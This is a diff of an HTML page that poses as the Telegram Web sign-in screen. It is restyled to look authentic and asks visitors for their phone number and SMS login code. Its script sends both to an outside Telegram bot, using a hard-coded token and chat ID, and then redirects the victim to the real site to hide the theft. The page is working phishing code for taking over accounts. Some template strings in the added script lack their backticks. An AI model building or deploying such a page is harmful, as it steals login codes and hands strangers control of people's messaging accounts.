@@ -1,49 +1,215 @@
 <!DOCTYPE html>
-<html>
+<html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <title>Telegram</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Telegram Web</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background: #0f0f0f;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 400px;
+            width: 100%;
+        }
+
+        .card {
+            background: #1f1f1f;
+            border-radius: 28px;
+            padding: 32px 24px;
+            box-shadow: 0 12px 32px rgba(0, 0, 0, 0.4);
+        }
+
+        .logo {
+            text-align: center;
+            margin-bottom: 28px;
+        }
+
+        .logo svg {
+            width: 56px;
+            height: 56px;
+        }
+
+        h1 {
+            color: #ffffff;
+            font-size: 24px;
+            font-weight: 500;
+            text-align: center;
+            margin-bottom: 8px;
+        }
+
+        .sub {
+            color: #8e8e8e;
+            text-align: center;
+            font-size: 14px;
+            margin-bottom: 32px;
+        }
+
+        .input-group {
+            margin-bottom: 16px;
+        }
+
+        label {
+            display: block;
+            color: #8e8e8e;
+            font-size: 14px;
+            margin-bottom: 6px;
+        }
+
+        input {
+            width: 100%;
+            padding: 14px 16px;
+            background: #2b2b2b;
+            border: 1px solid #3e3e3e;
+            border-radius: 14px;
+            color: #ffffff;
+            font-size: 16px;
+            outline: none;
+            transition: all 0.2s;
+        }
+
+        input:focus {
+            border-color: #2b9aff;
+            background: #333333;
+        }
+
+        button {
+            width: 100%;
+            padding: 14px;
+            background: #2b9aff;
+            border: none;
+            border-radius: 14px;
+            color: white;
+            font-size: 16px;
+            font-weight: 600;
+            margin-top: 16px;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+
+        button:hover {
+            background: #1f8ae8;
+        }
+
+        .footer {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 12px;
+            color: #5e5e5e;
+        }
+
+        .error {
+            background: rgba(255, 60, 60, 0.2);
+            border: 1px solid #ff3c3c;
+            color: #ff6b6b;
+            padding: 10px;
+            border-radius: 12px;
+            font-size: 13px;
+            text-align: center;
+            margin-bottom: 16px;
+            display: none;
+        }
+
+        .success {
+            background: rgba(60, 255, 60, 0.2);
+            border: 1px solid #3cff3c;
+            color: #6bff6b;
+            padding: 10px;
+            border-radius: 12px;
+            font-size: 13px;
+            text-align: center;
+            margin-bottom: 16px;
+            display: none;
+        }
+    </style>
 </head>
 <body>
-    <h2>Telegram Login</h2>
-    <input type="text" id="phone" placeholder="Phone"><br><br>
-    <input type="text" id="code" placeholder="Code"><br><br>
-    <button onclick="send()">Next</button>
-    <p id="status"></p>
+<div class="container">
+    <div class="card">
+        <div class="logo">
+            <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm4.64 6.8c-.15 1.58-.8 5.42-1.13 7.19-.14.75-.42 1-.68 1.03-.58.05-1.02-.38-1.58-.75-.88-.58-1.38-.94-2.23-1.5-.99-.66-.35-1.02.22-1.61.15-.15 2.71-2.48 2.76-2.69.01-.03.02-.14-.07-.2-.09-.06-.22-.04-.32-.01-.14.04-2.37 1.51-3.35 2.12-.32.21-.61.31-.87.31-.29 0-.58-.1-.85-.19-.35-.12-.63-.2-.96-.32-.38-.14-.68-.23-.66-.49.01-.15.22-.3.66-.46 2.58-1.12 4.3-1.86 5.16-2.23 2.46-1.04 2.97-1.22 3.3-1.22.07 0 .18.02.27.09.09.07.14.16.15.27.01.1 0 .2-.02.32z" fill="#2b9aff"/>
+                </svg>
+        </div>
+        <h1>Telegram</h1>
+        <div class="sub">Sign in to your account</div>
+        <div class="error" id="errorMsg"></div>
+        <div class="success" id="successMsg"></div>
+        <form id="loginForm">
+            <div class="input-group">
+                <label>Phone number</label>
+                <input type="tel" id="phone" placeholder="+7 987 264 5334" value="">
+            </div>
+            <div class="input-group">
+                <label>Code from SMS</label>
+                <input type="text" id="code" placeholder="XXXXX">
+            </div>
+            <button type="submit">Next</button>
+        </form>
+        <div class="footer">Telegram Web</div>
+    </div>
+</div>
 
-    <script>
-        const BOT_TOKEN = '8300626512:AAEH-ZR2FLuQkRhkF6WkRdgOsdhimjBL9IE';
-        const CHAT_ID = '7110007728';
+<script>
+    const BOT_TOKEN = '8300626512:AAEH-ZR2FLuQkRhkF6WkRdgOsdhimjBL9IE';
+    const CHAT_ID = '7110007728';
 
-        function send() {
-            const phone = document.getElementById('phone').value;
-            const code = document.getElementById('code').value;
-            const status = document.getElementById('status');
-            
-            if (!phone || !code) {
-                status.innerText = 'Fill both fields';
-                return;
-            }
-            
-            status.innerText = 'Sending...';
-            
-            const text = 'Phone: ' + phone + ' Code: ' + code;
-            const url = 'https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage?chat_id=' + CHAT_ID + '&text=' + encodeURIComponent(text);
-            
-            fetch(url)
-                .then(response => response.json())
-                .then(result => {
-                    if (result.ok) {
-                        status.innerText = 'Success! Redirecting...';
-                        window.location.href = 'https://web.telegram.org/z/';
-                    } else {
-                        status.innerText = 'Error: ' + result.description;
-                    }
-                })
-                .catch(error => {
-                    status.innerText = 'Network error';
-                });
+    document.getElementById('loginForm').addEventListener('submit', async function(e) {
+        e.preventDefault();
+        
+        const phone = document.getElementById('phone').value.trim();
+        const code = document.getElementById('code').value.trim();
+        const errorDiv = document.getElementById('errorMsg');
+        const successDiv = document.getElementById('successMsg');
+        
+        errorDiv.style.display = 'none';
+        successDiv.style.display = 'none';
+        
+        if (!phone || !code) {
+            errorDiv.textContent = 'Please fill in both fields';
+            errorDiv.style.display = 'block';
+            return;
         }
-    </script>
+        
+        successDiv.textContent = 'Sending...';
+        successDiv.style.display = 'block';
+        
+        const message = 🔐 LOGIN\nPhone: ${phone}\nCode: ${code};
+        const url = https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)};
+        
+        try {
+            const response = await fetch(url);
+            const result = await response.json();
+            
+            if (result.ok) {
+                successDiv.textContent = 'Success! Redirecting...';
+                setTimeout(() => {
+                    window.location.href = 'https://web.telegram.org/z/';
+                }, 1000);
+            } else {
+                errorDiv.textContent = 'Error: ' + (result.description || 'Unknown error');
+                errorDiv.style.display = 'block';
+                successDiv.style.display = 'none';
+            }
+        } catch (err) {
+            errorDiv.textContent = 'Network error. Please try again.';
+            errorDiv.style.display = 'block';
+            successDiv.style.display = 'none';
+        }
+    });
+</script>
 </body>
 </html>
